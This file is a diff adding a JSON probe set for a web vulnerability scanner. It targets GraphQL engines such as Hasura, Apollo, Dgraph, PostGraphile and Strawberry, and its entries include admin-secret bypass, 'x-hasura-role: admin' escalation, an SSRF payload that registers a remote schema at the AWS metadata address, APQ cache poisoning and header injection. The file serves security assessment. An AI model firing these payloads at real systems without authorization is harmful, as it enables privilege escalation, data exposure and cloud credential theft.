@@ -1,0 +1,216 @@
+{
+  "category": "graphql_engines",
+  "description": "Engine-specific GraphQL attacks beyond the generic introspection/depth/batch covered by graphql.json. Hasura (x-hasura-admin-secret bypass, admin role escalation), Apollo (APQ poisoning, federation introspection), Dgraph (mutation auth), PostGraphile (RLS bypass via _ prefix), Strawberry (Python-specific). Auto-probe enabled — engine-fingerprint matchers gate execution.",
+  "contexts": {
+    "hasura_admin_secret_check": {
+      "description": "Hasura GraphQL Engine — admin secret enforcement check. If x-hasura-admin-secret absent on /v1/graphql or /v1/metadata and introspection still works, no admin secret configured = admin-level access for everyone.",
+      "tech_match": ["hasura"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{ __schema { types { name } } }\"}",
+          "description": "Introspection without admin-secret header. If server returns full schema, no auth required.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["__Type", "types"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "{\"type\":\"export_metadata\",\"args\":{}}",
+          "description": "Hasura /v1/metadata export_metadata — anonymous call reveals entire backend config (db connections, remote schemas, action handlers, cron triggers)",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["sources", "tables", "metadata_version"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "hasura_role_header_escalation": {
+      "description": "Hasura uses x-hasura-role header. If JWT claims_map / unauthorized_role mis-set, attacker sends `x-hasura-role: admin` and gets admin-level query results.",
+      "tech_match": ["hasura"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "x-hasura-role: admin",
+          "description": "Header injection — bypass role enforcement if JWT verification doesn't pin role",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "hasura_remote_schema_ssrf": {
+      "description": "Hasura's remote_schema feature lets admin register an upstream GraphQL endpoint. If `add_remote_schema` reachable by attacker (because admin-secret absent / leaked), point at internal AWS metadata or attacker server → SSRF + arbitrary backend data inclusion.",
+      "tech_match": ["hasura"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"type\":\"add_remote_schema\",\"args\":{\"name\":\"swk-ssrf\",\"definition\":{\"url\":\"http://169.254.169.254/latest/meta-data/\",\"timeout_seconds\":2}}}",
+          "description": "Register remote schema pointing at AWS IMDS. Subsequent introspect call returns metadata response.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "apollo_persisted_query_poisoning": {
+      "description": "Apollo APQ (Automatic Persisted Queries) — client sends sha256Hash of query; if server caches hash→query mapping without auth check, attacker POSTs the unsigned hash + a crafted full query body and pollutes the cache.",
+      "tech_match": ["apollo"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"deadbeef...\"}}}",
+          "description": "First call: with hash but no query → server returns PersistedQueryNotFound. Second call: include both — if accepted, hash now permanent. Subsequent calls with that hash from any caller return cached crafted query.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["PersistedQueryNotFound", "PERSISTED_QUERY_NOT_FOUND"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "apollo_federation_internals": {
+      "description": "Apollo Federation — _service / _entities special root fields expose subgraph SDL. Often Apollo Gateway sits in front of internal services; querying _service against the gateway leaks internal subgraph names + routes.",
+      "tech_match": ["apollo", "federation"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{ _service { sdl } }\"}",
+          "description": "Federation reflection — returns full SDL of subgraph",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["\"sdl\"", "@key", "extend type"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{\"query\":\"query($r:[_Any!]!){_entities(representations:$r){... on User{id email role}}}\",\"variables\":{\"r\":[{\"__typename\":\"User\",\"id\":\"1\"}]}}",
+          "description": "Federation _entities resolver — accepts attacker-controlled representations. Some gateways trust __typename and skip authz on the resulting fetch.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["_entities"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "dgraph_admin_unauth": {
+      "description": "Dgraph — /admin endpoint exposes shutdown / draining / schema / backup operations. Auth via x-dgraph-accesstoken or x-dgraph-authtoken; default install has neither.",
+      "tech_match": ["dgraph"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{ getGQLSchema { schema } }\"}",
+          "description": "Read full Dgraph schema via /admin",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["schema", "getGQLSchema"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "postgraphile_underscore_bypass": {
+      "description": "PostGraphile auto-generates schema from Postgres tables. Fields starting with `_` are stripped by default — but if app code does its own RLS via session.user_id, an attacker can sometimes pass session variables via x-pg-* headers when PostGraphile's pgSettings plugin isn't locked.",
+      "tech_match": ["postgraphile"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "x-pg-user-id: 1",
+          "description": "Inject pgSettings via header. If pgDefaultRole / pgSettings plugin reads from request, RLS variables forged.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "{\"query\":\"{ pgFunctions: __schema { types { name fields { name } } } }\"}",
+          "description": "Enumerate types — exposes underlying Postgres tables 1:1",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["__schema", "types"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "graphql_field_suggestion_oracle": {
+      "description": "Most engines (graphql-js, apollo-server, ariadne) suggest similar field names when query fails — usable as oracle to brute-force schema even when introspection disabled. Single-character mutations reveal close field names.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{ user { passwor } }\"}",
+          "description": "Misspelled field — server returns 'Did you mean password?' suggestion",
+          "matchers": [
+            {"type": "status", "status": [200, 400], "condition": "or"},
+            {"type": "word", "words": ["Did you mean", "didYouMean"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "graphql_alias_amplification_dos": {
+      "description": "Boundary case for DoS — aliased same-field repetition multiplies cost N times in single request. Don't run massive amplifications (Rule 5 DoS) but a single 50-alias query proves the absence of an alias limit.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\":\"{ a1:user(id:1){name} a2:user(id:1){name} a3:user(id:1){name} a4:user(id:1){name} a5:user(id:1){name} }\"}",
+          "description": "Minimal alias test — 5 aliases of same query. If response includes all 5 entries, no alias dedup; document and stop.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["a1", "a2", "a3", "a4", "a5"], "condition": "and"}
+          ],
+          "severity": "low",
+          "confidence_boost": 30,
+          "variables": {}
+        }
+      ]
+    },
+    "strawberry_python_specifics": {
+      "description": "Strawberry GraphQL (Python) — debug mode + dev-tools enabled in non-prod environments leaked to prod. /graphql/schema endpoint may expose raw SDL.",
+      "tech_match": ["strawberry", "strawberry-graphql", "python"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/graphql/schema",
+          "description": "Strawberry schema SDL endpoint (dev-mode)",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["type Query", "schema"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
